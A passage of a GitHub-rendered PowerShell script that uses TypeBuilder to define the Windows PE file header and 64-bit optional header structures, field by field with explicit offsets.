          <td id="LC334" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>TimeDateStamp<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L335" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="335"></td>
          <td id="LC335" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>PointerToSymbolTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L336" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="336"></td>
          <td id="LC336" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>NumberOfSymbols<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L337" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="337"></td>
          <td id="LC337" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfOptionalHeader<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L338" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="338"></td>
          <td id="LC338" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Characteristics<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L339" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="339"></td>
          <td id="LC339" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_FILE_HEADER</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L340" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="340"></td>
          <td id="LC340" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_FILE_HEADER <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_FILE_HEADER</span></td>
        </tr>
        <tr>
          <td id="L341" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="341"></td>
          <td id="LC341" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L342" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="342"></td>
          <td id="LC342" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_OPTIONAL_HEADER64</span></td>
        </tr>
        <tr>
          <td id="L343" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="343"></td>
          <td id="LC343" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L344" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="344"></td>
          <td id="LC344" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_OPTIONAL_HEADER64<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">240</span>)</td>
        </tr>
        <tr>
          <td id="L345" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="345"></td>
          <td id="LC345" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Magic<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$MagicType</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">0</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L346" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="346"></td>
          <td id="LC346" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorLinkerVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">Byte</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">2</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L347" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="347"></td>
          <td id="LC347" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorLinkerVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">Byte</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">3</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L348" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="348"></td>
          <td id="LC348" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfCode<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">4</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L349" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="349"></td>
          <td id="LC349" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfInitializedData<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">8</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L350" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="350"></td>
          <td id="LC350" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfUninitializedData<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">12</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L351" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="351"></td>
          <td id="LC351" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>AddressOfEntryPoint<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">16</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L352" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="352"></td>
          <td id="LC352" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>BaseOfCode<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">20</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L353" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="353"></td>
          <td id="LC353" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ImageBase<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">24</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L354" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="354"></td>
          <td id="LC354" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SectionAlignment<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">32</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L355" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="355"></td>
          <td id="LC355" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>FileAlignment<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">36</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L356" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="356"></td>
          <td id="LC356" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorOperatingSystemVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">40</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L357" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="357"></td>
          <td id="LC357" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorOperatingSystemVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">42</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L358" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="358"></td>
          <td id="LC358" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorImageVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">44</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L359" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="359"></td>
          <td id="LC359" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorImageVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">46</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L360" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="360"></td>
          <td id="LC360" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorSubsystemVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">48</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L361" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="361"></td>
          <td id="LC361" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorSubsystemVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">50</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L362" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="362"></td>
          <td id="LC362" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Win32VersionValue<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">52</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L363" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="363"></td>
          <td id="LC363" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfImage<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">56</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L364" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="364"></td>
          <td id="LC364" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfHeaders<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">60</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L365" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="365"></td>
          <td id="LC365" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>CheckSum<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">64</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L366" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="366"></td>
          <td id="LC366" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Subsystem<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$SubSystemType</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">68</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L367" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="367"></td>
          <td id="LC367" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>DllCharacteristics<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$DllCharacteristicsType</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">70</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L368" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="368"></td>
          <td id="LC368" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfStackReserve<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">72</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L369" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="369"></td>
          <td id="LC369" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfStackCommit<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">80</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L370" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="370"></td>
          <td id="LC370" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfHeapReserve<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">88</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L371" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="371"></td>
          <td id="LC371" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfHeapCommit<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">96</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L372" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="372"></td>
          <td id="LC372" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>LoaderFlags<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">104</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L373" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="373"></td>
          <td id="LC373" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>NumberOfRvaAndSizes<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">108</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L374" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="374"></td>
          <td id="LC374" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ExportTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">112</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L375" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="375"></td>
          <td id="LC375" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ImportTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">120</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L376" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="376"></td>
          <td id="LC376" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ResourceTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">128</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L377" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="377"></td>
          <td id="LC377" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ExceptionTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">136</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L378" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="378"></td>
          <td id="LC378" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>CertificateTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">144</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L379" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="379"></td>
          <td id="LC379" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>BaseRelocationTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">152</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L380" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="380"></td>
          <td id="LC380" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Debug<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">160</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L381" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="381"></td>
